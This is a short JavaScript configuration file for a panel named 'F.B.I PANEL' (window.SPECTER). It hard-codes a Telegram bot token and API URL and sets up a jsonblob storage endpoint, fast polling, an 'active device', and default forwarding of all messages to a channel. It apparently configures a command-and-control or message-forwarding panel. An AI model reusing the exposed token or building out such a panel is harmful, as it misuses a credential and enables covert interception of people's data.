
/* ═══════════════════════════════════════════════════════════
   F.B.I PANEL CONFIG
   ═══════════════════════════════════════════════════════════ */
window.SPECTER = {
  BOT_TOKEN: '8834038897:AAHzJwwV_vHEa5MMNT-8EZuQoSQPhBWZYwo',
  TG_API: 'https://api.telegram.org/bot8834038897:AAHzJwwV_vHEa5MMNT-8EZuQoSQPhBWZYwo',

  BLOB_BASE: 'https://jsonblob.com/api/jsonBlob',

  LS_BLOB:    'fbi_blob_id',
  LS_CACHE:   'fbi_config_cache',
  LS_SESSION: 'fbi_session',
  LS_ACTIVE:  'fbi_active_device',

  POLL_MS: 500,

  DEFAULT_CONFIG: {
    channelId:      '',
    userId:         '',
    myNumber:       '',
    firebases:      [],
    forwardEnabled: true,
    forwardMode:    'all',
    botEnabled:     true
  }
};
